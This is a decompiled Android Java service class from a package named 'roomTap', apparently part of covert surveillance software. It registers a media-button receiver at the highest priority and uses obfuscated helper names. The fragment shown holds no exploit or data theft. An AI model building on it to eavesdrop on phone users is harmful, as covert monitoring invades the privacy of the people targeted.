package com.network.android.roomTap;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.IBinder;
import com.network.android.agent.NetworkApp;
import com.network.android.c.a.a;

public class MediaPlayerHandlerService extends Service {
    public IBinder onBind(Intent intent) {
        return null;
    }

    public void onCreate() {
        a.a("MediaPlayerHandlerService onCreate");
        super.onCreate();
        Context a2 = NetworkApp.a();
        try {
            a.a("registerMediaPlayerIntentReciever start");
            MediaPlayerIntentReciever.f112a = new MediaPlayerIntentReciever();
            IntentFilter intentFilter = new IntentFilter("android.intent.action.MEDIA_BUTTON");
            intentFilter.setPriority(9999);
            a2.registerReceiver(MediaPlayerIntentReciever.f112a, intentFilter);
        } catch (Throwable th) {
            a.a("registerMediaPlayerIntentReciever exception. ", th);
        }
    }

    public void onDestroy() {
        a.a("MediaPlayerHandlerService onDestroy");
        Context a2 = NetworkApp.a();
        try {
            a.a("unRegisterMediaPlayerIntentReciever start");
            if (MediaPlayerIntentReciever.f112a == null) {
                a.a("unRegisterMediaPlayerIntentReciever m_MediaButtonReceiver is null. returningc");
                return;
            }
            a2.unregisterReceiver(MediaPlayerIntentReciever.f112a);
            MediaPlayerIntentReciever.f112a = null;
        } catch (Throwable th) {
            a.a("unRegisterMediaPlayerIntentReciever exception.", th);
        }
    }

    public int onStartCommand(Intent intent, int i, int i2) {
        return 1;
    }
}
